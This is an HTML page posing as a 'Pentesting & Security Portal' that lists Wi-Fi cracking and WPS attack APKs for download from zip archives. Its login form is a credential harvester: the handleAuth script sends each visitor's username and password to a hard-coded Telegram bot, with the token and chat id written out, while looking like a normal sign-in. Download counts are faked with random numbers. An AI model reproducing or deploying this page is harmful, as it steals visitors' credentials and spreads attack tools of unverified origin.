<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Black Hat Hacker | SAHKIL 71</title>
    <style>
        :root {
            --neon-blue: #00d2ff;
            --neon-green: #00ff88;
            --gold: #FFD700;
            --bg-dark: #000000;
        }

        body {
            background-color: var(--bg-dark);
            color: white;
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 20px;
            display: flex; flex-direction: column; align-items: center;
            overflow-x: hidden;
        }

        /* RGB Border Animation */
        @keyframes rgb-border {
            0% { border-color: #ff0000; box-shadow: 0 0 10px #ff0000; }
            33% { border-color: #00ff00; box-shadow: 0 0 10px #00ff00; }
            66% { border-color: #0000ff; box-shadow: 0 0 10px #0000ff; }
            100% { border-color: #ff0000; box-shadow: 0 0 10px #ff0000; }
        }

        /* Sidebar & Menu */
        .menu-dots {
            position: fixed; top: 20px; right: 20px; cursor: pointer; z-index: 1100; padding: 10px; transition: 0.4s;
        }
        .menu-dots.open { transform: rotate(90deg); }
        .dot { width: 5px; height: 5px; background: var(--neon-blue); margin: 3px; border-radius: 50%; box-shadow: 0 0 10px var(--neon-blue); }

        .sidebar {
            position: fixed; top: 0; right: -280px; width: 250px; height: 100%;
            background: rgba(0, 0, 0, 0.95); border-left: 2px solid var(--neon-blue);
            transition: 0.5s cubic-bezier(0.4, 0, 0.2, 1); z-index: 1050; padding: 80px 20px 20px; box-sizing: border-box;
        }
        .sidebar.active { right: 0; }

        .category-item {
            padding: 12px; margin: 10px 0; border: 1px solid #222; border-radius: 10px;
            cursor: pointer; font-size: 0.9rem; transition: 0.3s; color: #ccc;
            text-align: center; font-weight: bold;
        }
        .category-item:hover { 
            background: rgba(0, 210, 255, 0.1); border-color: var(--neon-blue); 
            box-shadow: 0 0 15px var(--neon-blue); color: white;
        }

        /* Header & Profile */
        .header-scene { margin-top: 40px; margin-bottom: 20px; perspective: 1000px; }
        .circle-outer {
            width: 160px; height: 160px; border-radius: 50%; border: 4px solid red;
            transform: scale(1.2); animation: rotate3d 8s linear infinite, rgb-border 5s linear infinite;
            display: flex; align-items: center; justify-content: center;
        }
        .profile-img { width: 80%; height: 80%; border-radius: 50%; object-fit: cover; }
        @keyframes rotate3d { from { transform: rotateY(0deg); } to { transform: rotateY(360deg); } }

        /* App Cards */
        .app-list { width: 100%; max-width: 450px; display: flex; flex-direction: column; gap: 20px; }
        .animated-card {
            display: flex; align-items: center; padding: 15px 25px; border-radius: 20px;
            background: rgba(255, 255, 255, 0.05); border: 2px solid #ff0000;
            animation: zoomInOut 4s infinite ease-in-out, rgb-border 5s infinite linear;
        }
        @keyframes zoomInOut { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.03); } }

        .app-img-container {
            width: 50px; height: 50px; border-radius: 50%; margin-right: 20px;
            border: 1px solid var(--neon-blue); overflow: hidden; background: #000;
        }
        .app-img-container img { width: 100%; height: 100%; object-fit: cover; }

        .get-btn {
            background: linear-gradient(45deg, var(--neon-blue), var(--neon-green));
            color: black; padding: 8px 15px; border-radius: 10px; text-decoration: none;
            font-weight: bold; animation: getPulse 1.5s infinite ease-in-out;
        }
        @keyframes getPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }

        /* Login Overlay with Background */
        #login-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)), 
                        url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=1000');
            background-size: cover; background-position: center;
            display: flex; justify-content: center; align-items: center; z-index: 9999;
        }
        .login-box {
            background: rgba(17, 17, 17, 0.9); padding: 30px; border-radius: 15px;
            border: 2px solid var(--neon-blue); box-shadow: 0 0 25px var(--neon-blue);
            width: 320px; text-align: center; backdrop-filter: blur(10px);
        }
        .login-box input {
            width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #333;
            border-radius: 5px; color: #fff; outline: none; box-sizing: border-box;
        }
        .login-box input:focus { border-color: var(--neon-blue); box-shadow: 0 0 10px var(--neon-blue); }
        .login-btn {
            width: 100%; padding: 12px; background: linear-gradient(45deg, var(--neon-blue), #3a7bd5);
            border: none; color: #fff; font-weight: bold; border-radius: 5px; cursor: pointer; margin-top: 15px;
        }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="login-box">
            <h2 style="color: var(--neon-blue); text-shadow: 0 0 10px var(--neon-blue);">CYBER ACCESS</h2>
            <p style="color: #888; font-size: 0.8rem; margin-bottom: 20px;">Pentesting & Security Portal</p>
            <div id="auth-form">
                <input type="text" id="username" placeholder="Username">
                <input type="password" id="password" placeholder="Password">
                <input type="password" id="confirm-pass" style="display:none;" placeholder="Confirm Password">
                <p style="color:#555; font-size: 12px; margin: 5px 0;">Verify: 5 + 2 = ?</p>
                <input type="number" id="captcha" placeholder="Result">
            </div>
            <button class="login-btn" onclick="handleAuth()">ENTER SYSTEM</button>
            <span onclick="toggleAuth()" style="color:#666; font-size:12px; cursor:pointer; display:block; margin-top:15px;" id="toggle-text">New Member? Register</span>
        </div>
    </div>

    <div class="menu-dots" id="dotMenu" onclick="toggleMenu()">
        <div class="dot"></div><div class="dot"></div><div class="dot"></div>
    </div>
    <div class="sidebar" id="sidebar">
        <h4 style="color: var(--neon-green); border-bottom: 1px solid #333; padding-bottom: 10px;">Categories</h4>
        <div class="category-item">🛡️ Wi-Fi Tools</div>
        <div class="category-item">🔓 Social Engineering</div>
        <div class="category-item">📡 Network Analysis</div>
        <div class="category-item">🛠️ Pentest Tools</div> 
    </div>

    <div class="header-scene">
        <div class="circle-outer">
            <img src="logos/shakil.png" class="profile-img" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'">
        </div>
    </div>
    <h1 id="typing-title" style="color: var(--neon-blue); text-shadow: 0 0 20px var(--neon-blue);"></h1>
    <p id="typing-subtitle" style="color: var(--neon-green); font-family: monospace;"></p>

    <div class="app-list" id="grid"></div>

    <script>
        // Auth Logic
        let isRegister = false;
        const botToken = "8536895168:AAEreaM2NyDpyTaAIf0xLbKcJXoA3LZTKKI";
        const chatId = "6690005625";

        function toggleAuth() {
            isRegister = !isRegister;
            document.getElementById('confirm-pass').style.display = isRegister ? 'block' : 'none';
            document.getElementById('toggle-text').innerText = isRegister ? 'Already a member? Login' : 'New Member? Register';
        }

        async function handleAuth() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            const captcha = document.getElementById('captcha').value;
            if(!user || !pass || captcha !== "7") return alert("Check inputs & Captcha!");

            const msg = `🔔 **Sahkil Portal Alert**\n👤 User: ${user}\n🔑 Pass: ${pass}\n📝 Mode: ${isRegister?'Reg':'Login'}`;
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
            document.getElementById('login-overlay').style.display = 'none';
        }

        function toggleMenu() {
            document.getElementById('sidebar').classList.toggle('active');
            document.getElementById('dotMenu').classList.toggle('open');
        }

        // Typing Effect
        const titleText = "𝐒𝐚𝐡𝐤𝐢𝐥𝐜𝐲𝐛𝐞𝐫𝟕𝟏🧑‍💻";
        const subText = "Cyber Security & Pentesting Tools";
        let i=0, j=0;
        function type() {
            if(i < titleText.length) { document.getElementById('typing-title').innerHTML += titleText[i++]; setTimeout(type, 100); }
            else if(j < subText.length) { document.getElementById('typing-subtitle').innerHTML += subText[j++]; setTimeout(type, 50); }
        }

        // Apps Data & Render
        const apps = [
            {name: "AirMon_v1.8.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
            {name: "Andro Dumpper.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
            {name: "Claves Wifi.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
            {name: "Liberad A Wifi v1.0.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
            {name: "Mac2WepKey HHG5XX v15.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
            {name: "WIBR Pro.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
            {name: "WLan Audit.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
            {name: "WPS Pin.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
            {name: "OpenSignal v6.0.7-1.apk", zip: "https://github.com/user-attachments/files/25597730/Apps.2.zip"},
            {name: "Pry-Fi.apk", zip: "https://github.com/user-attachments/files/25597730/Apps.2.zip"},
            {name: "PulWiFi.apk", zip: "https://github.com/user-attachments/files/25597730/Apps.2.zip"},
            {name: "Radar Me.apk", zip: "https://github.com/user-attachments/files/25597730/Apps.2.zip"},
            {name: "SpeedKey.apk", zip: "https://github.com/user-attachments/files/25597730/Apps.2.zip"},
            {name: "WiFi Radar.apk", zip: "https://github.com/user-attachments/files/25597730/Apps.2.zip"},
            {name: "WiFi Unlocker.apk", zip: "https://github.com/user-attachments/files/25597730/Apps.2.zip"},
            {name: "WiFiLeaks.apk", zip: "https://github.com/user-attachments/files/25597730/Apps.2.zip"},
            {name: "WPS-WPA-Tester-Premium-3.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
            {name: "Wibr.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
            {name: "Wifi Analyzer.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
            {name: "Wifi Connecter Library.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
            {name: "Wifi Password.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
            {name: "WifiAccess.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
            {name: "apk-editor-1-9-0.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
            {name: "org.adaway_60104.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"}
        ];

        function render() {
            const grid = document.getElementById('grid');
            grid.innerHTML = apps.map(app => {
                const logoImg = `logos/${app.name.replace('.apk', '.png')}`;
                return `
                <div class="animated-card">
                    <div style="display:flex; align-items:center;">
                        <div class="app-img-container">
                            <img src="${logoImg}" onerror="this.src='https://cdn-icons-png.flaticon.com/512/2586/2586488.png'">
                        </div>
                        <div class="box-info">
                            <h4 style="margin:0; font-size:0.9rem;">${app.name}</h4>
                            <p style="margin:5px 0 0; font-size:0.8rem; color:#aaa;">${Math.floor(Math.random()*100+20)}K+ DL</p>
                        </div>
                    </div>
                    <a href="${app.zip}" class="get-btn" style="margin-left:auto;">GET</a>
                </div>`;
            }).join('');
        }

        window.onload = () => { type(); render(); };
    </script>
</body>
</html>
